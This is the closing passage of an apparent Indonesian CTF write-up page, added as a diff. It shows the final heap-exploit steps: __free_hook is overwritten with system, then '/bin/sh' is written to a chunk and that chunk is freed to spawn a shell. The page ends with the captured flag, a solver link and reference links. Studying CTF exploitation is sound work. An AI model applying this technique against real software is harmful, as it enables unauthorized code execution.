+<span style="color:#75715e"># 00:0000│   0x7ffff7fbdb28 (__free_hook) —▸ 0x7ffff7e24410 (system) ◂— endbr64 </span>
+
+modify(<span style="color:#ae81ff">13</span>, <span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)
+unsubscribe(<span style="color:#ae81ff">13</span>)
+</code></pre></div><p>Tambahkan <code>try except</code> untuk automasi bruteforce.</p>
+<p><img src="../images/success.png" alt="leak"></p>
+<h2 id="flag-3">Flag</h2>
+<p><code>flag{welcome_you_are_now_one_of_us_4d2d08c6994188b642a854194916fbbc}</code></p>
+<h1 id="footnote-1">Footnote</h1>
+<p>Nice challanges, untuk solver dan source soal <a href="../source/source.zip">disini</a>.</p>
+<h1 id="reference">Reference</h1>
+<ul>
+<li><a href="http://blog.rh0gue.com/2017-12-31-34c3ctf-300/">http://blog.rh0gue.com/2017-12-31-34c3ctf-300/</a></li>
+<li><a href="https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/">https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/</a></li>
+<li><a href="https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique">https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique</a></li>
+<li><a href="https://znqt.github.io/hitcon2018-babytcache/">https://znqt.github.io/hitcon2018-babytcache/</a></li>
+</ul>
+
+
+		
+	</div>
+
+	
+	
+</main>
+
+
+        		<footer>
+			
+            <figure class="article-discussion">
+			  <div id="disqus_thread"></div>
+<script type="application/javascript">
+    var disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "abdullahnz" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+            </figure>
+			
+			<span>
+			&copy; <time datetime="2021-03-23 08:32:38.057187844 &#43;0700 WIB m=&#43;0.322607448">2021</time> . Made with <a href='https://gohugo.io'>Hugo</a> using the <a href='https://github.com/EmielH/tale-hugo/'>Tale</a> theme.
+			</span>
+		</footer>
+
+    </body>
+</html>
